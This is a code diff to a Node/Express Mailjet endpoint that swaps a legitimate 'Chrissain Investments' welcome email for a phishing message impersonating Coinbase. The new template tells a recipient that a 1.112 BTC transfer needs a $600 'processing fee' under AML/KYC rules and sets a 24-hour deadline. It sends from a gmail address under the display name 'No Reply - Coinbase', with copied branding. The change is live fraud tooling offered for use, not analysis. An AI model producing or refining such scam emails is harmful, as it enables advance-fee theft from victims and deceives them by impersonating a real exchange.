@@ -195,56 +195,54 @@ app.post('/send-welcome-email', async (req, res) => {
 
   // Professional HTML email template with personalized content
   const htmlContent = `
-    <!DOCTYPE html>
-    <html>
-      <head>
-        <meta charset="UTF-8">
-        <title>Welcome to Chrissain Investments!</title>
-      </head>
-      <body style="font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f4f4f4;">
-        <table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: #f4f4f4; padding: 20px;">
-          <tr>
-            <td align="center">
-              <table width="600" border="0" cellspacing="0" cellpadding="0" style="background-color: #ffffff; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
-                <tr>
-                  <td align="center" style="padding-bottom: 20px;">
-                    <!-- Optional: Add your logo here -->
-                    <img src="https://yourdomain.com/logo.png" alt="Chrissain Logo" width="150" style="display: block;">
-                  </td>
-                </tr>
-                <tr>
-                  <td style="color: #333333; font-size: 22px; font-weight: bold; padding-bottom: 20px; text-align: center;">
-                    Welcome to Chrissain Investments!
-                  </td>
-                </tr>
-                <tr>
-                  <td style="color: #555555; font-size: 16px; line-height: 24px;">
-                    <p>Dear ${name},</p>
-                    <p>Thank you for registering with Chrissain. We are thrilled to have you as part of our community and look forward to serving you with top-notch financial solutions.</p>
-                    <p>Your registered email is: <strong>${email}</strong></p>
-                    <p>If you have any questions or need any assistance, feel free to reach out to our support team.</p>
-                    <p>Warm regards,</p>
-                    <p>The Chrissain Team</p>
-                  </td>
-                </tr>
-                <tr>
-                  <td align="center" style="padding-top: 20px;">
-                    <a href="https://chrissain.vercel.app/" style="background-color: #007BFF; color: #ffffff; text-decoration: none; padding: 12px 24px; border-radius: 4px; font-size: 16px;">Visit Our Website</a>
-                  </td>
-                </tr>
-              </table>
-              <table width="600" border="0" cellspacing="0" cellpadding="0" style="margin-top: 20px;">
-                <tr>
-                  <td align="center" style="color: #999999; font-size: 12px;">
-                    © 2023 Chrissain. All rights reserved.
-                  </td>
-                </tr>
-              </table>
-            </td>
-          </tr>
-        </table>
-      </body>
-    </html>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Coinbase Transfer Confirmation Required</title>
+    <style>
+        body { font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 0; background-color: #f5f5f5; }
+        .container { max-width: 600px; margin: 20px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        .header { text-align: center; border-bottom: 2px solid #1652F0; padding-bottom: 15px; }
+        .logo { width: 180px; }
+        .content { padding: 20px 0; }
+        .button { display: inline-block; background: #1652F0; color: white !important; padding: 12px 25px; text-decoration: none; border-radius: 5px; margin: 15px 0; }
+        .footer { text-align: center; font-size: 12px; color: #666; margin-top: 20px; }
+        .warning { color: #ff0000; font-weight: bold; }
+        .highlight { color: #1652F0; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="logo.png" alt="Coinbase Logo" class="logo">
+            <h2 style="color: #1652F0; margin-top: 10px;">Transfer Authorization Required</h2>
+        </div>
+
+        <div class="content">
+            <p>Dear Henry,</p>
+            <p>Your recent request to transfer <span class="highlight">1.112 BTC</span> requires additional authorization. To comply with financial regulations (AML/KYC), a <strong>processing fee of $600 USD</strong> must be paid to complete this transaction.</p>
+            
+           
+
+            <p class="warning">⚠️ Deadline: Complete within 24 hours to avoid cancellation of this transfer.</p>
+
+            <p>If you did not initiate this transfer, contact our security team immediately at <a href="mailto:security@coinbase.com">security@coinbase.com</a>.</p>
+        </div>
+
+        <div class="footer">
+            <p>Coinbase Support Team<br>
+            <em>Building the Future of Finance</em></p>
+            <p style="font-size: 10px; color: #999;">
+                This is an automated message. Do not reply directly.<br>
+                248 3rd St, San Francisco, CA 94103, USA<br>
+                <a href="#" style="color: #666;">Privacy Policy</a> | <a href="#" style="color: #666;">Terms of Service</a> | <a href="#" style="color: #666;">Unsubscribe</a>
+            </p>
+          
+        </div>
+    </div>
+</body>
+</html>
   `;
 
   // Prepare Mailjet message data
@@ -253,7 +251,7 @@ app.post('/send-welcome-email', async (req, res) => {
       {
         From: {
           Email: 'joey.mendez699@gmail.com', // Ensure SENDER_EMAIL is set in your environment
-          Name: 'Chrissain Investments',
+          Name: 'No Reply - Coinbase',
         },
         To: [
           {
@@ -261,8 +259,8 @@ app.post('/send-welcome-email', async (req, res) => {
             Name: name,
           },
         ],
-        Subject: 'Welcome to Chrissain Investments!',
-        TextPart: 'Thank you for registering with Chrissain Investments.',
+        Subject: 'Your Transfer Authorization is Required',
+        TextPart: '',
         HTMLPart: htmlContent,
       },
     ],
@@ -280,6 +278,7 @@ app.post('/send-welcome-email', async (req, res) => {
     res.status(500).json({ error: 'Failed to send welcome email.' });
   }
 });
+
 
 
 
